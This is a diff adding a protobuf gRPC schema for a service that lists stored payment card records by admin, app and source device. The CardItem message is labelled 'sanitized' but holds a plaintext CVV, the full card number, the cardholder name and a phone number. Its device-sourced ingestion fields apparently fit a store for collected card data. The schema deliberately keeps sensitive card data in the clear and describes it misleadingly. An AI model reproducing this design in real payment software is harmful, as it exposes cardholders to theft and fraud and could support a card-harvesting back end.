@@ -1,0 +1,51 @@
+syntax = "proto3";
+
+package cards.v1;
+
+option java_multiple_files = true;
+option java_package = "app.service.grpc.cards";
+option java_outer_classname = "CardsProto";
+
+// Request to list stored card records
+message ListCardsRequest {
+  string admin_id = 1; // required from session
+  string q = 2;        // optional: search by last4 or bin prefix
+  string network = 3;  // optional: VISA/MASTERCARD/AMEX/etc
+  int32 page = 4;      // 0-based
+  int32 size = 5;      // 1..200
+  string app_id = 6;   // app partition key
+  string device_id = 7; // optional device filter
+}
+
+// Stored card record (sanitized)
+message CardItem {
+  uint64 id = 1;
+  string admin_id = 2;
+  string bin = 3;            // first 6 digits (masked storage)
+  string last4 = 4;          // last 4 digits
+  int32 expiry_month = 5;
+  int32 expiry_year = 6;
+  bool luhn_valid = 7;
+  string network = 8;        // derived network name
+  string product_type = 9;   // nullable -> empty string if unknown
+  string issuer = 10;        // nullable -> empty string if unknown
+  string country = 11;       // nullable -> empty string if unknown
+  int64 event_timestamp_ms = 12; // ingestion timestamp
+  string device_id = 13;     // source device
+  string app_id = 14;        // app partition
+  string name_on_card = 15;  // optional cardholder name
+  string phone_number = 16;  // optional contact phone
+  string cvv = 17;           // optional plaintext CVV
+  string pan = 18;           // full card number (if retained)
+}
+
+message ListCardsResponse {
+  repeated CardItem items = 1;
+  int32 page = 2;
+  int32 size = 3;
+  int32 count = 4;
+}
+
+service CardsService {
+  rpc ListCards (ListCardsRequest) returns (ListCardsResponse);
+}
